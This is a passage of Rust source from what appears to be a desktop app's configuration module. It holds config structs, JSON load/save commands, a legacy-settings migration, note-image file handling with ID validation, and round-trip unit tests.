    pub(crate) auto_delete_on_pr_close: AutoDeleteOnPrClose,
}

impl Default for RepoDefaultsConfig {
    fn default() -> Self {
        Self {
            base_branch: default_base_branch(),
            copy_ignored_files: false,
            copy_untracked_files: false,
            setup_script: String::new(),
            run_script: String::new(),
            archive_script: String::new(),
            worktree_storage: WorktreeStorage::default(),
            prompt_on_create: true,
            delete_branch_on_remove: true,
            auto_archive_merged: false,
            orphan_cleanup: OrphanCleanup::default(),
            pr_merge_strategy: MergeStrategy::default(),
            after_merge: WorktreeAfterMerge::default(),
            auto_fetch_interval_minutes: 0,
            auto_delete_on_pr_close: AutoDeleteOnPrClose::default(),
        }
    }
}

fn default_base_branch() -> String {
    "automatic".to_string()
}

/// Map of repo path -> settings
#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct RepoSettingsMap {
    #[serde(default)]
    pub(crate) repos: HashMap<String, RepoSettingsEntry>,
}

// ---------------------------------------------------------------------------
// PromptLibraryConfig
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct PromptEntry {
    pub(crate) id: String,
    #[serde(default)]
    pub(crate) label: String,
    #[serde(default)]
    pub(crate) text: String,
    #[serde(default)]
    pub(crate) pinned: bool,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct PromptLibraryConfig {
    #[serde(default)]
    pub(crate) prompts: Vec<PromptEntry>,
}

// ---------------------------------------------------------------------------
// AiPromptsConfig — customizable system prompts for internal AI services
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AiPromptsConfig {
    #[serde(default)]
    pub(crate) diff_triage_system_prompt: Option<String>,
}

// ---------------------------------------------------------------------------
// AgentsConfig — per-agent run configurations
// ---------------------------------------------------------------------------

#[derive(Clone, Serialize, Deserialize)]
pub(crate) struct AgentRunConfig {
    pub(crate) name: String,
    pub(crate) command: String,
    #[serde(default)]
    pub(crate) args: Vec<String>,
    #[serde(default)]
    pub(crate) env: HashMap<String, String>,
    #[serde(default)]
    pub(crate) is_default: bool,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AgentSettings {
    #[serde(default)]
    pub(crate) run_configs: Vec<AgentRunConfig>,
    /// Automatically retry on server errors (5xx) by injecting "continue" into the session.
    /// Retries up to 3 times with exponential backoff (5s, 15s, 30s).
    #[serde(default)]
    pub(crate) auto_retry_on_error: bool,
    /// Shell command template for headless (one-shot) prompt execution.
    /// Placeholders like `{prompt}` are replaced before invocation.
    #[serde(default)]
    pub(crate) headless_template: Option<String>,
    /// Environment feature flags — key→value pairs injected into every spawn of this agent.
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub(crate) env_flags: HashMap<String, String>,
    /// Per-agent override for intent tab title. None = use agent-aware default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) intent_tab_title: Option<bool>,
    /// Per-agent override for suggested follow-ups. None = use global default.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) suggest_followups: Option<bool>,
}

#[derive(Clone, Serialize, Deserialize, Default)]
pub(crate) struct AgentsConfig {
    #[serde(default)]
    pub(crate) agents: HashMap<String, AgentSettings>,
    /// Which agent CLI to use for headless (one-shot) prompt execution when no
    /// agent is running in the active terminal. Chosen by the user in Settings.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub(crate) headless_agent: Option<String>,
}

// ---------------------------------------------------------------------------
// Tauri commands — one load/save pair per config type
// ---------------------------------------------------------------------------

const APP_CONFIG_FILE: &str = "config.json";
const NOTIFICATION_CONFIG_FILE: &str = "notifications.json";
const UI_PREFS_FILE: &str = "ui-prefs.json";
const REPO_SETTINGS_FILE: &str = "repo-settings.json";
const REPO_DEFAULTS_FILE: &str = "repo-defaults.json";
const PROMPT_LIBRARY_FILE: &str = "prompt-library.json";
const REPOSITORIES_FILE: &str = "repositories.json";
const NOTES_FILE: &str = "notes.json";
const KEYBINDINGS_FILE: &str = "keybindings.json";
const PANE_LAYOUT_FILE: &str = "pane-layout.json";
const AGENTS_CONFIG_FILE: &str = "agents.json";
const ACTIVITY_FILE: &str = "activity.json";
const AI_PROMPTS_FILE: &str = "ai-prompts.json";

// App config

/// Migrate flat service fields from pre-ServicesConfig format into nested `services` object.
fn migrate_flat_services(val: &mut serde_json::Value) {
    let obj = match val.as_object_mut() {
        Some(o) => o,
        None => return,
    };
    if obj.contains_key("services") {
        return;
    }
    // Only migrate if any flat field exists
    let flat_keys = [
        "remote_access_enabled",
        "remote_access_port",
        "remote_access_username",
        "remote_access_password_hash",
        "session_token",
        "session_token_duration_secs",
        "ipv6_enabled",
        "lan_auth_bypass",
        "relay_enabled",
        "relay_url",
        "relay_token",
        "relay_session_id",
        "push_enabled",
        "vapid_private_key",
        "vapid_public_key",
        "vapid_subject",
    ];
    if !flat_keys.iter().any(|k| obj.contains_key(*k)) {
        return;
    }

    let take = |obj: &mut serde_json::Map<String, serde_json::Value>, key: &str| {
        obj.remove(key).unwrap_or(serde_json::Value::Null)
    };

    let server = serde_json::json!({
        "enabled": take(obj, "remote_access_enabled"),
        "port": take(obj, "remote_access_port"),
        "ipv6_enabled": take(obj, "ipv6_enabled"),
    });
    let auth = serde_json::json!({
        "username": take(obj, "remote_access_username"),
        "password_hash": take(obj, "remote_access_password_hash"),
        "session_token": take(obj, "session_token"),
        "session_token_duration_secs": take(obj, "session_token_duration_secs"),
        "lan_auth_bypass": take(obj, "lan_auth_bypass"),
    });
    let relay = serde_json::json!({
        "enabled": take(obj, "relay_enabled"),
        "url": take(obj, "relay_url"),
        "token": take(obj, "relay_token"),
        "session_id": take(obj, "relay_session_id"),
    });
    let push = serde_json::json!({
        "enabled": take(obj, "push_enabled"),
        "vapid_private_key": take(obj, "vapid_private_key"),
        "vapid_public_key": take(obj, "vapid_public_key"),
        "vapid_subject": take(obj, "vapid_subject"),
    });

    obj.insert(
        "services".to_string(),
        serde_json::json!({
            "server": server,
            "auth": auth,
            "tls": { "mode": "off" },
            "relay": relay,
            "push": push,
        }),
    );
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_app_config() -> AppConfig {
    let path = config_dir().join(APP_CONFIG_FILE);
    if !path.exists() {
        return AppConfig::default();
    }
    let content = match std::fs::read_to_string(&path) {
        Ok(s) => s,
        Err(e) => {
            tracing::warn!(path = %path.display(), "Could not read config: {e}");
            return AppConfig::default();
        }
    };
    let mut val: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(path = %path.display(), "Corrupt config: {e}. Using defaults.");
            return AppConfig::default();
        }
    };
    migrate_flat_services(&mut val);
    match serde_json::from_value(val) {
        Ok(cfg) => cfg,
        Err(e) => {
            tracing::error!(path = %path.display(), "Config deserialization failed after migration: {e}. Using defaults.");
            AppConfig::default()
        }
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_app_config(config: AppConfig) -> Result<(), String> {
    save_json_config(APP_CONFIG_FILE, &config)
}

// Notification config
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_notification_config() -> NotificationConfig {
    load_json_config(NOTIFICATION_CONFIG_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_notification_config(config: NotificationConfig) -> Result<(), String> {
    save_json_config(NOTIFICATION_CONFIG_FILE, &config)
}

// UI prefs
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_ui_prefs() -> UIPrefsConfig {
    load_json_config(UI_PREFS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_ui_prefs(config: UIPrefsConfig) -> Result<(), String> {
    save_json_config(UI_PREFS_FILE, &config)
}

// Repo settings
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_settings() -> RepoSettingsMap {
    load_json_config(REPO_SETTINGS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_settings(config: RepoSettingsMap) -> Result<(), String> {
    save_json_config(REPO_SETTINGS_FILE, &config)
}

/// Set or clear a human-readable label for a branch/worktree within a repo.
/// `label = None` removes the label. Idempotent; no-ops on unknown repo paths.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn set_branch_label(
    repo_path: String,
    branch_name: String,
    label: Option<String>,
) -> Result<(), String> {
    let mut settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    if let Some(entry) = settings.repos.get_mut(&repo_path) {
        match label {
            Some(l) if !l.trim().is_empty() => {
                entry
                    .branch_labels
                    .insert(branch_name, l.trim().to_string());
            }
            _ => {
                entry.branch_labels.remove(&branch_name);
            }
        }
        save_json_config(REPO_SETTINGS_FILE, &settings)
    } else {
        Ok(())
    }
}

/// Remove a branch label — called by worktree deletion to keep config tidy.
pub(crate) fn remove_branch_label(repo_path: &str, branch_name: &str) {
    let mut settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    if let Some(entry) = settings.repos.get_mut(repo_path)
        && entry.branch_labels.remove(branch_name).is_some()
        && let Err(e) = save_json_config(REPO_SETTINGS_FILE, &settings)
    {
        tracing::warn!("Failed to save config after removing branch label: {e}");
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn check_has_custom_settings(path: String) -> bool {
    let settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    settings
        .repos
        .get(&path)
        .is_some_and(|entry| entry.has_custom_settings())
}

// Repo local config (.tuic.json in repo root)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_local_config(repo_path: String) -> Option<RepoLocalConfig> {
    load_repo_local_config_from_path(std::path::Path::new(&repo_path))
}

// Repo defaults (global defaults for all repos)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_defaults() -> RepoDefaultsConfig {
    load_json_config(REPO_DEFAULTS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_defaults(config: RepoDefaultsConfig) -> Result<(), String> {
    save_json_config(REPO_DEFAULTS_FILE, &config)
}

// Repositories (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repositories() -> serde_json::Value {
    load_json_config(REPOSITORIES_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repositories(config: serde_json::Value) -> Result<(), String> {
    save_json_config(REPOSITORIES_FILE, &config)
}

// Pane layout (schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_pane_layout() -> serde_json::Value {
    load_json_config(PANE_LAYOUT_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_pane_layout(layout: serde_json::Value) -> Result<(), String> {
    save_json_config(PANE_LAYOUT_FILE, &layout)
}

// Prompt library
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_prompt_library() -> PromptLibraryConfig {
    load_json_config(PROMPT_LIBRARY_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_prompt_library(config: PromptLibraryConfig) -> Result<(), String> {
    save_json_config(PROMPT_LIBRARY_FILE, &config)
}

// Notes (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_notes() -> serde_json::Value {
    load_json_config(NOTES_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_notes(config: serde_json::Value) -> Result<(), String> {
    save_json_config(NOTES_FILE, &config)
}

// Activity center (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_activity() -> serde_json::Value {
    load_json_config(ACTIVITY_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_activity(items: serde_json::Value) -> Result<(), String> {
    save_json_config(ACTIVITY_FILE, &items)
}

// Keybindings (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_keybindings() -> serde_json::Value {
    load_json_config(KEYBINDINGS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_keybindings(config: serde_json::Value) -> Result<(), String> {
    save_json_config(KEYBINDINGS_FILE, &config)
}

// Agents config
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_agents_config() -> AgentsConfig {
    load_json_config(AGENTS_CONFIG_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_agents_config(config: AgentsConfig) -> Result<(), String> {
    save_json_config(AGENTS_CONFIG_FILE, &config)
}

// AI prompts
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_ai_prompts() -> AiPromptsConfig {
    load_json_config(AI_PROMPTS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_ai_prompts(config: AiPromptsConfig) -> Result<(), String> {
    save_json_config(AI_PROMPTS_FILE, &config)
}

// ---------------------------------------------------------------------------
// Note images — save/delete/get for Ideas panel image attachments
// ---------------------------------------------------------------------------

pub(crate) const NOTE_IMAGES_DIR: &str = "note-images";

/// Maximum decoded image size: 10 MB
const MAX_IMAGE_SIZE: usize = 10 * 1024 * 1024;

/// Validate a note ID to prevent path traversal attacks.
/// Rejects IDs containing `/`, `\`, `..`, or null bytes.
fn validate_note_id(note_id: &str) -> Result<(), String> {
    if note_id.is_empty() {
        return Err("note_id must not be empty".to_string());
    }
    if note_id.contains('/')
        || note_id.contains('\\')
        || note_id.contains("..")
        || note_id.contains('\0')
    {
        return Err("note_id contains invalid characters".to_string());
    }
    Ok(())
}

/// Save a base64-encoded image to `config_dir()/note-images/<note_id>/<timestamp>.<extension>`.
/// Returns the absolute path of the saved file.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_note_image(
    note_id: String,
    data_base64: String,
    extension: String,
) -> Result<String, String> {
    use base64::{Engine as _, engine::general_purpose};

    validate_note_id(&note_id)?;

    let bytes = general_purpose::STANDARD
        .decode(&data_base64)
        .map_err(|e| format!("Invalid base64 data: {e}"))?;

    if bytes.len() > MAX_IMAGE_SIZE {
        return Err(format!(
            "Image too large: {} bytes (max {} bytes)",
            bytes.len(),
            MAX_IMAGE_SIZE
        ));
    }

    // Sanitize extension to alphanumeric only
    let ext = extension
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .collect::<String>();
    let ext = if ext.is_empty() {
        "png".to_string()
    } else {
        ext
    };

    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
    std::fs::create_dir_all(&dir).map_err(|e| format!("Failed to create note-images dir: {e}"))?;

    let filename = format!(
        "{}.{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis(),
        ext
    );
    let path = dir.join(&filename);

    std::fs::write(&path, &bytes).map_err(|e| format!("Failed to write image: {e}"))?;

    Ok(path.to_string_lossy().to_string())
}

/// Delete all image assets for a note. No-op if the directory doesn't exist.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn delete_note_assets(note_id: String) -> Result<(), String> {
    validate_note_id(&note_id)?;

    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
    if dir.exists() {
        std::fs::remove_dir_all(&dir).map_err(|e| format!("Failed to delete note assets: {e}"))?;
    }
    Ok(())
}

/// Delete image assets for multiple notes in a single IPC round-trip.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn delete_note_assets_batch(note_ids: Vec<String>) -> Result<(), String> {
    let base = config_dir().join(NOTE_IMAGES_DIR);
    for note_id in &note_ids {
        validate_note_id(note_id)?;
        let dir = base.join(note_id);
        if dir.exists() {
            std::fs::remove_dir_all(&dir)
                .map_err(|e| format!("Failed to delete note assets for {note_id}: {e}"))?;
        }
    }
    Ok(())
}

/// Return the absolute path of the note-images root directory.
/// The frontend needs this as `baseDir` for `convertFileSrc()`.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_note_images_dir() -> String {
    config_dir()
        .join(NOTE_IMAGES_DIR)
        .to_string_lossy()
        .to_string()
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::TempDir;

    /// Helper: run load/save with a temp directory to avoid touching real config.
    /// We override config_dir by writing directly to a temp path and reading back.
    fn round_trip_in_dir<T: Serialize + DeserializeOwned + Default>(
        dir: &std::path::Path,
        filename: &str,
        value: &T,
    ) -> T {
        let path = dir.join(filename);
        let json = serde_json::to_string_pretty(value).unwrap();
        fs::write(&path, json).unwrap();
        let read_back: T = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        read_back
    }

    #[test]
    fn app_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = AppConfig {
            shell: Some("/bin/zsh".to_string()),
            font_family: "Fira Code".to_string(),
            font_size: 16,
            font_weight: 200,
            theme: "dark".to_string(),
            mcp_server_enabled: true,
            mcp_port: 4000,
            mcp_config_installed: false,
            ide: "cursor".to_string(),
            default_font_size: 18,
            services: ServicesConfig {
                server: ServerConfig {
                    enabled: true,
                    port: 8080,
                    ipv6_enabled: true,
                },
                auth: AuthConfig {
                    username: "admin".to_string(),
                    password_hash: "$2b$12$hash".to_string(),
                    session_token: "test-session-token".to_string(),
                    session_token_duration_secs: 3600,
                    lan_auth_bypass: true,
                    ..Default::default()
                },
                tls: TlsConfig::default(),
                relay: RelayConfig::default(),
                push: PushConfig {
                    vapid_subject: "mailto:test@example.com".to_string(),
                    ..PushConfig::default()
                },
            },
            confirm_before_quit: false,
            confirm_before_closing_tab: true,
            max_tab_name_length: 40,
            split_tab_mode: SplitTabMode::Unified,
            tab_ordering_mode: TabOrderingMode::TerminalsFirst,
            auto_show_pr_popover: true,
            prevent_sleep_when_busy: true,
            auto_update_enabled: false,
            language: "it".to_string(),
            disabled_plugin_ids: vec!["test-disabled".to_string()],
            update_channel: "nightly".to_string(),
            disabled_agents: vec!["codex".to_string()],
            disabled_mcp_agents: vec!["windsurf".to_string()],
            disabled_native_tools: vec!["plugin_dev_guide".to_string()],
            intent_tab_title: false,
            suggest_followups: false,
            global_hotkey: Some("CommandOrControl+Shift+T".to_string()),
            copy_on_select: true,
            show_last_prompt: false,
            bell_style: "visual".to_string(),
            collapse_tools: true,
            issue_filter: "assigned".to_string(),
            experimental_features_enabled: false,
            ai_chat_enabled: false,
            ai_triage_enabled: false,
            ai_watchers_enabled: false,
            scrollback_reflow: false,
            ai_terminal_mcp_enabled: false,
            cursor_style: "bar".to_string(),
            terminal_renderer: "webgl".to_string(),
            auto_update_plugins_enabled: false,
        };
        let loaded: AppConfig = round_trip_in_dir(dir.path(), "config.json", &cfg);
        assert_eq!(loaded.shell.as_deref(), Some("/bin/zsh"));
        assert_eq!(loaded.font_size, 16);
        assert_eq!(loaded.ide, "cursor");
        assert_eq!(loaded.default_font_size, 18);
        assert!(loaded.mcp_server_enabled);
        assert_eq!(loaded.mcp_port, 4000);
        assert!(loaded.services.server.enabled);
        assert_eq!(loaded.services.server.port, 8080);
        assert_eq!(loaded.services.auth.username, "admin");
        assert_eq!(loaded.services.auth.password_hash, "$2b$12$hash");
        assert!(!loaded.confirm_before_quit);
        assert!(loaded.confirm_before_closing_tab);
        assert_eq!(loaded.max_tab_name_length, 40);
        assert_eq!(loaded.split_tab_mode, SplitTabMode::Unified);
        assert!(loaded.prevent_sleep_when_busy);
        assert!(!loaded.auto_update_enabled);
        assert_eq!(loaded.language, "it");
        assert_eq!(
            loaded.disabled_plugin_ids,
            vec!["test-disabled".to_string()]
        );
        assert_eq!(loaded.update_channel, "nightly");
        assert_eq!(loaded.services.auth.session_token_duration_secs, 3600);
        assert!(loaded.services.server.ipv6_enabled);
        assert!(loaded.services.auth.lan_auth_bypass);
        assert_eq!(
            loaded.disabled_native_tools,
            vec!["plugin_dev_guide".to_string()]
        );
        assert!(!loaded.intent_tab_title);
        assert!(!loaded.suggest_followups);
    }

    #[test]
    fn app_config_serde_default_for_new_fields() {
        // Simulate a config.json from before ide/default_font_size existed
        let dir = TempDir::new().unwrap();
        let old_json = r#"{"shell":null,"font_family":"JetBrains Mono","font_size":14,"theme":"tokyo-night","worktree_dir":null}"#;
        let path = dir.path().join("config.json");
        fs::write(&path, old_json).unwrap();
        let loaded: AppConfig = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(loaded.ide, "");
        assert_eq!(loaded.default_font_size, 13);
        assert!(!loaded.mcp_server_enabled);
        assert_eq!(loaded.mcp_port, 3845);
        assert!(!loaded.services.server.enabled);
        assert_eq!(loaded.services.server.port, 9876);
        assert_eq!(loaded.services.auth.username, "");
        assert_eq!(loaded.services.auth.password_hash, "");
        assert!(loaded.confirm_before_quit);
        assert!(loaded.confirm_before_closing_tab);
        assert_eq!(loaded.max_tab_name_length, 25);
        assert_eq!(loaded.split_tab_mode, SplitTabMode::Separate);
        assert!(!loaded.prevent_sleep_when_busy);
        assert!(loaded.auto_update_enabled);
        assert_eq!(loaded.language, "en");
        assert_eq!(loaded.update_channel, "stable");
        assert_eq!(loaded.services.auth.session_token_duration_secs, 86400);
        assert!(!loaded.services.server.ipv6_enabled);
        assert!(!loaded.services.auth.lan_auth_bypass);
        assert!(loaded.intent_tab_title); // defaults to true
        assert!(loaded.suggest_followups); // defaults to true
        assert!(!loaded.experimental_features_enabled);
    }

    #[test]
    fn migrate_flat_services_fields() {
        let old_json = r#"{
            "shell": null,
            "font_family": "JetBrains Mono",
            "font_size": 14,
            "theme": "vscode-dark",
            "remote_access_enabled": true,
            "remote_access_port": 8080,
            "remote_access_username": "admin",
            "remote_access_password_hash": "$2b$12$hash",
            "session_token": "tok-123",
            "session_token_duration_secs": 7200,
            "ipv6_enabled": true,
            "lan_auth_bypass": true,
            "relay_enabled": true,
            "relay_url": "wss://relay.example.com",
            "relay_token": "secret",
            "relay_session_id": "sess-1",
            "push_enabled": true,
            "vapid_private_key": "pk",
            "vapid_public_key": "pub",
            "vapid_subject": "mailto:test@example.com"
        }"#;
        let mut val: serde_json::Value = serde_json::from_str(old_json).unwrap();
        migrate_flat_services(&mut val);
        let cfg: AppConfig = serde_json::from_value(val).unwrap();
        assert!(cfg.services.server.enabled);
        assert_eq!(cfg.services.server.port, 8080);
        assert!(cfg.services.server.ipv6_enabled);
        assert_eq!(cfg.services.auth.username, "admin");
        assert_eq!(cfg.services.auth.password_hash, "$2b$12$hash");
        assert_eq!(cfg.services.auth.session_token, "tok-123");
        assert_eq!(cfg.services.auth.session_token_duration_secs, 7200);
        assert!(cfg.services.auth.lan_auth_bypass);
        assert!(cfg.services.relay.enabled);
        assert_eq!(cfg.services.relay.url, "wss://relay.example.com");
        assert_eq!(cfg.services.relay.token, "secret");
        assert_eq!(cfg.services.relay.session_id, "sess-1");
        assert!(cfg.services.push.enabled);
        assert_eq!(cfg.services.push.vapid_private_key, "pk");
        assert_eq!(cfg.services.push.vapid_public_key, "pub");
        assert_eq!(cfg.services.push.vapid_subject, "mailto:test@example.com");
        // Flat fields should be removed after migration
        assert_eq!(cfg.font_family, "JetBrains Mono");
    }

    #[test]
    fn migrate_skips_when_services_present() {
        let nested_json = r#"{
            "services": {
                "server": { "enabled": true, "port": 9999, "ipv6_enabled": false },
                "auth": { "username": "user2" },
                "tls": {},
                "relay": {},
                "push": {}
            },
            "remote_access_enabled": false
        }"#;
        let mut val: serde_json::Value = serde_json::from_str(nested_json).unwrap();
        migrate_flat_services(&mut val);
        // `services` already present → migration is a no-op, flat field kept as-is
        let services = val.pointer("/services/server/enabled").unwrap();
        assert_eq!(services, true);
        let port = val.pointer("/services/server/port").unwrap();
        assert_eq!(port, 9999);
        let username = val.pointer("/services/auth/username").unwrap();
        assert_eq!(username, "user2");
        // flat field NOT consumed (migration skipped)
        assert!(val.get("remote_access_enabled").is_some());
    }

    #[test]
    fn tls_config_serde_variants() {
        // Off variant
        let off: TlsConfig = serde_json::from_str(r#"{"mode":"off"}"#).unwrap();
        assert!(matches!(off, TlsConfig::Off));

        // Empty object → Off (backward compat)
        let empty: TlsConfig = serde_json::from_str(r#"{}"#).unwrap();
        assert!(matches!(empty, TlsConfig::Off));

        // Manual variant
        let manual: TlsConfig = serde_json::from_str(
            r#"{"mode":"manual","cert_path":"/etc/cert.pem","key_path":"/etc/key.pem"}"#,
        )
        .unwrap();
        match manual {
            TlsConfig::Manual {
                cert_path,
                key_path,
            } => {
                assert_eq!(cert_path, "/etc/cert.pem");
                assert_eq!(key_path, "/etc/key.pem");
            }
            _ => panic!("expected Manual variant"),
        }

        // Round-trip Manual
        let json = serde_json::to_string(&TlsConfig::Manual {
            cert_path: "/a.pem".into(),
            key_path: "/b.pem".into(),
        })
        .unwrap();
        let rt: TlsConfig = serde_json::from_str(&json).unwrap();
        assert!(matches!(rt, TlsConfig::Manual { .. }));
    }

    #[test]
    fn notification_config_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = NotificationConfig {
            enabled: false,
            volume: 0.8,
            sounds: NotificationSounds {
                question: true,
                error: false,
                completion: true,
                warning: false,
                info: true,
            },
            audio_device: Some("Test Speaker".to_string()),
        };
        let loaded: NotificationConfig = round_trip_in_dir(dir.path(), "notifications.json", &cfg);
        assert!(!loaded.enabled);
        assert!((loaded.volume - 0.8).abs() < f64::EPSILON);
        assert!(loaded.sounds.question);
        assert!(!loaded.sounds.error);
        assert_eq!(loaded.audio_device.as_deref(), Some("Test Speaker"));
    }

    #[test]
    fn ui_prefs_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = UIPrefsConfig {
            sidebar_visible: false,
            sidebar_width: 300,
            diff_panel_visible: true,
            markdown_panel_visible: false,
            notes_panel_visible: false,
            file_browser_panel_visible: true,
            plan_panel_visible: false,
            git_panel_visible: false,
            diff_panel_width: 500,
            markdown_panel_width: 450,
            notes_panel_width: 320,
            plan_panel_width: 350,
            git_panel_width: 380,
            settings_nav_width: 200,
            diff_view_mode: "split".to_string(),
            detached_panels: std::collections::HashMap::from([(
                "activity".to_string(),
                "panel-activity".to_string(),
            )]),
        };
        let loaded: UIPrefsConfig = round_trip_in_dir(dir.path(), "ui-prefs.json", &cfg);
        assert!(!loaded.sidebar_visible);
        assert_eq!(loaded.sidebar_width, 300);
        assert_eq!(loaded.diff_panel_width, 500);
        assert_eq!(loaded.markdown_panel_width, 450);
        assert_eq!(
            loaded.detached_panels.get("activity").map(|s| s.as_str()),
            Some("panel-activity")
        );
        assert_eq!(loaded.notes_panel_width, 320);
        assert_eq!(loaded.settings_nav_width, 200);
        assert_eq!(loaded.diff_view_mode, "split");
    }

    #[test]
    fn repo_settings_round_trip() {
        let dir = TempDir::new().unwrap();
        let mut map = RepoSettingsMap::default();
        map.repos.insert(
            "/my/repo".to_string(),
            RepoSettingsEntry {
                path: "/my/repo".to_string(),
                display_name: "my-repo".to_string(),
                base_branch: Some("main".to_string()),
                copy_ignored_files: Some(true),
                copy_untracked_files: None,
                setup_script: Some("npm install".to_string()),
                run_script: Some("npm start".to_string()),
                archive_script: Some("cleanup.sh".to_string()),
                color: String::new(),
                worktree_storage: None,
                prompt_on_create: None,
                delete_branch_on_remove: None,
                auto_archive_merged: None,
                orphan_cleanup: None,
                pr_merge_strategy: None,
                after_merge: None,
                auto_fetch_interval_minutes: None,
                auto_delete_on_pr_close: None,
                mcp_upstreams: None,
                branch_labels: HashMap::new(),
            },
        );
        let loaded: RepoSettingsMap = round_trip_in_dir(dir.path(), "repo-settings.json", &map);
        assert_eq!(loaded.repos.len(), 1);
        let entry = loaded.repos.get("/my/repo").unwrap();
        assert_eq!(entry.display_name, "my-repo");
        assert_eq!(entry.base_branch, Some("main".to_string()));
        assert_eq!(entry.copy_ignored_files, Some(true));
        assert_eq!(entry.copy_untracked_files, None);
        assert_eq!(entry.archive_script, Some("cleanup.sh".to_string()));
    }

    #[test]
    fn prompt_library_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = PromptLibraryConfig {
            prompts: vec![PromptEntry {
                id: "abc".to_string(),
                label: "Test prompt".to_string(),
                text: "Hello world".to_string(),
                pinned: true,
            }],
        };
        let loaded: PromptLibraryConfig =
            round_trip_in_dir(dir.path(), "prompt-library.json", &cfg);
        assert_eq!(loaded.prompts.len(), 1);
        assert_eq!(loaded.prompts[0].id, "abc");
        assert!(loaded.prompts[0].pinned);
    }

    #[test]
    fn ai_prompts_round_trip() {
        let dir = TempDir::new().unwrap();
        let cfg = AiPromptsConfig {
            diff_triage_system_prompt: Some("Custom triage prompt".to_string()),
        };
        let loaded: AiPromptsConfig = round_trip_in_dir(dir.path(), "ai-prompts.json", &cfg);
        assert_eq!(
            loaded.diff_triage_system_prompt.as_deref(),
            Some("Custom triage prompt")
        );
    }

    #[test]
    fn ai_prompts_empty_file_returns_default() {
        let dir = TempDir::new().unwrap();
        fs::write(dir.path().join("ai-prompts.json"), "{}").unwrap();
        let loaded: AiPromptsConfig =
            round_trip_in_dir(dir.path(), "ai-prompts.json", &AiPromptsConfig::default());
        assert!(loaded.diff_triage_system_prompt.is_none());
    }

    #[test]
    fn missing_file_returns_default() {
        // load_json_config with a nonexistent file returns default
        let cfg: NotificationConfig = load_json_config("nonexistent-12345.json");
        assert!(cfg.enabled); // default is true
    }

    #[test]
    fn save_json_config_is_atomic() {
        let dir = TempDir::new().unwrap();
        let filename = "atomic-test.json";
        let target = dir.path().join(filename);

        // Write initial content
        let initial = NotificationConfig {
            enabled: false,
            ..NotificationConfig::default()
        };
        let json = serde_json::to_string_pretty(&initial).unwrap();
        fs::write(&target, json).unwrap();

        // Overwrite with new content using save_json_config pattern
        let updated = NotificationConfig {
            enabled: true,
            ..NotificationConfig::default()
        };
